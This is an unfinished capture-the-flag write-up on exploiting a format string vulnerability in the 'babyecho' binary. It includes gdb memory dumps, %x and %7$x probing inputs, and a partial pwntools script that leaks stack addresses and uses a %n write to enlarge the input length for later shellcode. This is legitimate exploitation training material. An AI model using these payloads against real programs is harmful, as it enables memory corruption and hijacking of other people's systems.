## Babyecho writeup
We start by setting a breakpoint just at the beginning of the loop in <code>0x08048fb6</code>where a buffer of 1023 bytes is passed into <code>eax</code> register. We continue one step and we can see how it compares the default value of 13 bytes with the eax register.
<pre><code>gef➤  x/xw $esp+0x10
0xbffff1a0:	0x0000000d</code></pre>
But if we continue we see how to set the default value to 13 bytes and then read the string Default 13 bytes <code>0x80be5f1</code>, therefore we must overwrite the variable in some way.
After the first call the next function is <code>fread</code> and we have to pass some input. The best way to interact with our application is to see in our input vector and see its output.
<pre><code>naivenom@ubuntu:~/Desktop/baby/babyecho$ ./babyecho 
Reading 13 bytes
%x.%x.%x.%x 
d.a.0.d</code></pre>
So what we can observe is a kind of format string vulnerability. It is very interesting to understand this vulnerability well since it allows us to control writing or reading of memory. In a basic example we have this function <code>printf(Hi %s, pointer)</code> The function replaces the format with the first argument being a pointer to where the string is contained. 
Next we try to introduce <code>%x%x%x%x%x</code> and we will realize that the last value corresponds to a stack memory address
<pre><code>naivenom@ubuntu:~/Desktop/baby/babyecho$ ./babyecho 
Reading 13 bytes
%x%x%x%x%x
da0dbfc3a22c</code></pre>
So the stack it would be something like this:
<pre><code>0xd 0xa 0x0 0xbfc3a22c</code></pre>
We run gdb again and introduce a few <code>AAAA</code>
<pre><code>gef➤  x/64xw $esp
0xbffff190:	0xbffff1ac	0x0000000d	0x0000000a	0x00000000
0xbffff1a0:	0x0000000d	0xbffff1ac	0x00000000	0x41414141</code></pre>
Ahh, cool we realize that the memory address that we had made leak turns out to be a pointer where we have writing. We can check it in the same way by executing the application and passing the same input but don't forget that we just have 13 bytes to write so we can solve this problem like this <code>AAAA.%5$x</code>
<pre><code>naivenom@ubuntu:~/Desktop/baby/babyecho$ ./babyecho 
Reading 13 bytes
AAAA.%5$x
AAAA.bff2d09c</code></pre>
But if we take a look what we saw in memory with gdb we see that there is a displacement from where our pointer is to where we write, therefore the argument is the seventh.
<pre><code>naivenom@ubuntu:~/Desktop/baby/babyecho$ ./babyecho 
Reading 13 bytes
AAAA.%7$x
AAAA.41414141</code></pre>
Cool!.The next step is knowing that the aslr is activated we need to leak the memory address where it points to writing in memory and be able to use it in our exploit and see the displacement of offsets to where the variable of the 13 bytes is contained so we can modify it by overwriting using format string vulnerability and also as our binary is in a loop we can take the opportunity several times to use our vulnerability in different stages. So we need to leak the stack memory address which contain <code>0xd</code>. We can use this script for leaking and overwriting the variable.
<pre><code>from pwn import *

p = remote("192.168.80.132", 1234)
log.info(p.recvuntil("\n"))

#STAGE 1: We leak the pointer where we can overwrite with format string vulnerabilty and edit 13 bytes to 1023 for writing shellcode + memory address
p.sendline("%5$x")
buffer_address = int(p.recvuntil("\n"), 16)
log.info("Memory address pointer to write:  %s" % hex(buffer_address))
log.info(p.recvuntil("\n"))
p.sendline("%4$x")
content = int(p.recvuntil("\n"), 16)
log.info("Default lenght of buffer 13 bytes: %s" % hex(content))
log.info(p.recvuntil("\n"))

x = int(buffer_address)-12
log.info("Memory address where is 13 bytes: %s" % hex(x))
leak = ""
leak += p32(x+1)
leak += "%99x%7$n"
log.info("Length of payload: %s" % str(len(leak)))
p.sendline(leak)
p.recvuntil("\n")
log.info(p.recvuntil("\n"))</code></pre>
[Writting...]

